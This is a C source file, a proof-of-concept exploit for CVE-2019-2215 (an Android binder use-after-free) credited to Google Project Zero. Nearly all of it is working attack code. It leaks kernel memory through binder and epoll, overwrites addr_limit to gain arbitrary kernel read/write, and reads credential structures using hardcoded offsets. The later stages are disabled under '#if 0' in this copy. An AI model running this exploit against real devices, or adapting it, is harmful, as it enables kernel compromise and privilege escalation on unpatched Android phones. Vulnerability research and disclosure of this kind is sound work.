// writes xs
/*
 * POC to gain arbitrary kernel R/W access using CVE-2019-2215
 * https://bugs.chromium.org/p/project-zero/issues/detail?id=1942
 *
 * Jann Horn & Maddie Stone of Google Project Zero
 *
 * 3 October 2019
*/

#define _GNU_SOURCE
#include <stdbool.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <ctype.h>
#include <sys/uio.h>
#include <err.h>
#include <sched.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <linux/sched.h>
#include <string.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <errno.h>

#define LEAK_AMOUNT 4096

#define MIN(x,y) ((x)<(y) ? (x) : (y))
#define MAX(x,y) ((x)>(y) ? (x) : (y))

#define BINDER_THREAD_EXIT 0x40046208ul
// NOTE: we don't cover the task_struct* here; we want to leave it uninitialized
#define BINDER_THREAD_SZ 0x190
#define IOVEC_ARRAY_SZ (BINDER_THREAD_SZ / 16) //25
#define WAITQUEUE_OFFSET (0x98)
#define IOVEC_INDX_FOR_WQ (WAITQUEUE_OFFSET / 16) //10
#define UAF_SPINLOCK 0x10001
#define PAGE 0x1000

void hexdump_memory(unsigned char *buf, size_t byte_count) {
  unsigned long byte_offset_start = 0;
  if (byte_count % 16)
    errx(1, "hexdump_memory called with non-full line");
  for (unsigned long byte_offset = byte_offset_start; byte_offset < byte_offset_start + byte_count;
          byte_offset += 16) {
    char line[1000];
    char *linep = line;
    linep += sprintf(linep, "%08lx  ", byte_offset);
    for (int i=0; i<16; i++) {
      linep += sprintf(linep, "%02hhx ", (unsigned char)buf[byte_offset + i]);
    }
    linep += sprintf(linep, " |");
    for (int i=0; i<16; i++) {
      char c = buf[byte_offset + i];
      if (isalnum(c) || ispunct(c) || c == ' ') {
        *(linep++) = c;
      } else {
        *(linep++) = '.';
      }
    }
    linep += sprintf(linep, "|");
    puts(line);
  }
}

int epfd;

void *dummy_page_4g_aligned;
unsigned long current_ptr;
int binder_fd;

void leak_data(void* leakBuffer, int leakAmount)
{
  int dataBufferSize = MAX(UAF_SPINLOCK+leakAmount, PAGE);
  char* dataBuffer = malloc(dataBufferSize); // TODO: free me!
  if (dataBuffer == NULL) err(1, "allocating dataBuffer");
  memset(dataBuffer, 0, dataBufferSize);
  struct epoll_event event = { .events = EPOLLIN };
  if (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &event)) err(1, "epoll_add");

  struct iovec iovec_array[IOVEC_ARRAY_SZ];

  memset(iovec_array, 0, sizeof(iovec_array));

  iovec_array[IOVEC_INDX_FOR_WQ-1].iov_base = dataBuffer; 
  iovec_array[IOVEC_INDX_FOR_WQ-1].iov_len = PAGE; 
  iovec_array[IOVEC_INDX_FOR_WQ].iov_base = dataBuffer; 
  iovec_array[IOVEC_INDX_FOR_WQ].iov_len = 0; /* spinlock: will turn to UAF_SPINLOCK */
  iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_base = dataBuffer; /* wq->task_list->next */
  iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_len = leakAmount+UAF_SPINLOCK; /* wq->task_list->prev */
  
  int b;
  
  int pipefd[2];
  int leakPipe[2];
  if (pipe(pipefd)) err(1, "pipe");
  if (pipe(leakPipe)) err(2, "pipe");
  if (fcntl(pipefd[0], F_SETPIPE_SZ, PAGE) != PAGE) err(1, "pipe size");

  pid_t fork_ret = fork();
  if (fork_ret == -1) err(1, "fork");
  if (fork_ret == 0){
    /* Child process */
    prctl(PR_SET_PDEATHSIG, SIGKILL);
    sleep(2);
    printf("CHILD: Doing EPOLL_CTL_DEL.\n");
    epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &event);
    printf("CHILD: Finished EPOLL_CTL_DEL.\n");
    // first page: dummy data
    printf("CHILD: initial page\n");
    if (read(pipefd[0], dataBuffer, PAGE) != PAGE) err(1, "read first page from pipe");
    printf("CHILD: dummy data\n");
    if (read(pipefd[0], dataBuffer, UAF_SPINLOCK) != UAF_SPINLOCK) err(1, "read dummy data from pipe");
    printf("CHILD: leak data\n");
    if (read(pipefd[0], dataBuffer, leakAmount) != leakAmount) err(1, "leaking");
    close(pipefd[1]);
    write(leakPipe[1], dataBuffer, leakAmount);
    printf("CHILD: Finished write to FIFO.\n");
    exit(0);
  }
  printf("PARENT: Calling WRITEV\n");
  ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
  b = writev(pipefd[1], iovec_array, IOVEC_ARRAY_SZ);
  printf("writev() returns 0x%x\n", (unsigned int)b);
  if (b != PAGE + leakAmount + UAF_SPINLOCK) 
        err(1, "writev() returned wrong value");
  // leaked data
//  printf("PARENT: Reading leaked data\n");
  if (read(leakPipe[0], leakBuffer, leakAmount) != leakAmount) err(1, "reading leak");

  int status;
  if (wait(&status) != fork_ret) err(1, "wait");
  printf("PARENT: Done with leaking\n");
}

void clobber_addr_limit(void)
{
  struct epoll_event event = { .events = EPOLLIN };
  if (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &event)) err(1, "epoll_add");

  struct iovec iovec_array[IOVEC_ARRAY_SZ];
  memset(iovec_array, 0, sizeof(iovec_array));

  unsigned long second_write_chunk[] = {
    1, /* iov_len */
    0xdeadbeef, /* iov_base (already used) */
    0x8 + 2 * 0x10, /* iov_len (already used) */
    current_ptr + 0x8, /* next iov_base (addr_limit) */
    8, /* next iov_len (sizeof(addr_limit)) */
    0xfffffffffffffffe /* value to write */
  };

  iovec_array[IOVEC_INDX_FOR_WQ].iov_base = dummy_page_4g_aligned; /* spinlock in the low address half must be zero */
  iovec_array[IOVEC_INDX_FOR_WQ].iov_len = 1; /* wq->task_list->next */
  iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_base = (void *)0xDEADBEEF; /* wq->task_list->prev */
  iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_len = 0x8 + 2 * 0x10; /* iov_len of previous, then this element and next element */
  iovec_array[IOVEC_INDX_FOR_WQ + 2].iov_base = (void *)0xBEEFDEAD;
  iovec_array[IOVEC_INDX_FOR_WQ + 2].iov_len = 8; /* should be correct from the start, kernel will sum up lengths when importing */

  int socks[2];
  if (socketpair(AF_UNIX, SOCK_STREAM, 0, socks)) err(1, "socketpair");
  if (write(socks[1], "X", 1) != 1) err(1, "write socket dummy byte");

  pid_t fork_ret = fork();
  if (fork_ret == -1) err(1, "fork");
  if (fork_ret == 0){
    /* Child process */
    prctl(PR_SET_PDEATHSIG, SIGKILL);
    sleep(2);
    printf("CHILD: Doing EPOLL_CTL_DEL.\n");
    epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &event);
    printf("CHILD: Finished EPOLL_CTL_DEL.\n");
    if (write(socks[1], second_write_chunk, sizeof(second_write_chunk)) != sizeof(second_write_chunk))
      err(1, "write second chunk to socket");
    exit(0);
  }
  ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
  struct msghdr msg = {
    .msg_iov = iovec_array,
    .msg_iovlen = IOVEC_ARRAY_SZ
  };
  int recvmsg_result = recvmsg(socks[0], &msg, MSG_WAITALL);
  printf("recvmsg() returns %d, expected %lu\n", recvmsg_result,
      (unsigned long)(iovec_array[IOVEC_INDX_FOR_WQ].iov_len +
      iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_len +
      iovec_array[IOVEC_INDX_FOR_WQ + 2].iov_len));
}

int kernel_rw_pipe[2];
void kernel_write(unsigned long kaddr, void *buf, unsigned long len) {
  errno = 0;
  if (len > PAGE) errx(1, "kernel writes over PAGE_SIZE are messy, tried 0x%lx", len);
  if (write(kernel_rw_pipe[1], buf, len) != len) err(1, "kernel_write failed to load userspace buffer");
  if (read(kernel_rw_pipe[0], (void*)kaddr, len) != len) err(1, "kernel_write failed to overwrite kernel memory");
}
void kernel_read(unsigned long kaddr, void *buf, unsigned long len) {
  errno = 0;
  if (len > PAGE) errx(1, "kernel writes over PAGE_SIZE are messy, tried 0x%lx", len);
  if (write(kernel_rw_pipe[1], (void*)kaddr, len) != len) errx(1, "kernel_read failed to read kernel memory at 0x%lx", (unsigned long)kaddr);
  if (read(kernel_rw_pipe[0], buf, len) != len) err(1, "kernel_read failed to write out to userspace");
}
unsigned long kernel_read_ulong(unsigned long kaddr) {
  unsigned long data;
  kernel_read(kaddr, &data, sizeof(data));
  return data;
}
void kernel_write_ulong(unsigned long kaddr, unsigned long data) {
  kernel_write(kaddr, &data, sizeof(data));
}
void kernel_write_uint(unsigned long kaddr, unsigned int data) {
  kernel_write(kaddr, &data, sizeof(data));
}

// Linux localhost 4.4.177-g83bee1dc48e8 #1 SMP PREEMPT Mon Jul 22 20:12:03 UTC 2019 aarch64
// data from `pahole` on my own build with the same .config
#define OFFSET__task_struct__mm 0x520
#define OFFSET__task_struct__cred 0x790
#define OFFSET__mm_struct__user_ns 0x300
#define OFFSET__uts_namespace__name__version 0xc7
// SYMBOL_* are relative to _head; data from /proc/kallsyms on userdebug
#define SYMBOL__init_user_ns 0x202f2c8
#define SYMBOL__init_task 0x20257d0
#define SYMBOL__init_uts_ns 0x20255c0

int main(void) {
  printf("Starting POC\n");
  //pin_to(0);

/*  dummy_page_4g_aligned = mmap((void*)0x100000000UL, 0x2000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
  if (dummy_page_4g_aligned != (void*)0x100000000UL)
    err(1, "mmap 4g aligned"); */
  if (pipe(kernel_rw_pipe)) err(1, "kernel_rw_pipe");

  binder_fd = open("/dev/binder", O_RDONLY);
  epfd = epoll_create(1000);
  unsigned char leaked[4096];
  leak_data(leaked, 4096);
  hexdump_memory(leaked, 4096);
  
#if 0 // TODO
  clobber_addr_limit();

  setbuf(stdout, NULL);
  printf("should have stable kernel R/W now\n");

  /* in case you want to do stuff with the creds, to show that you can get them: */
  unsigned long current_mm = kernel_read_ulong(current_ptr + OFFSET__task_struct__mm);
  printf("current->mm == 0x%lx\n", current_mm);
  unsigned long current_user_ns = kernel_read_ulong(current_mm + OFFSET__mm_struct__user_ns);
  printf("current->mm->user_ns == 0x%lx\n", current_user_ns);
  unsigned long kernel_base = current_user_ns - SYMBOL__init_user_ns;
  printf("kernel base is 0x%lx\n", kernel_base);
  if (kernel_base & 0xfffUL) errx(1, "bad kernel base (not 0x...000)");
  unsigned long init_task = kernel_base + SYMBOL__init_task;
  printf("&init_task == 0x%lx\n", init_task);
  unsigned long init_task_cred = kernel_read_ulong(init_task + OFFSET__task_struct__cred);
  printf("init_task.cred == 0x%lx\n", init_task_cred);
  unsigned long my_cred = kernel_read_ulong(current_ptr + OFFSET__task_struct__cred);
  printf("current->cred == 0x%lx\n", my_cred);

  unsigned long init_uts_ns = kernel_base + SYMBOL__init_uts_ns;
  char new_uts_version[] = "EXPLOITED KERNEL";
  kernel_write(init_uts_ns + OFFSET__uts_namespace__name__version, new_uts_version, sizeof(new_uts_version));
#endif  
}
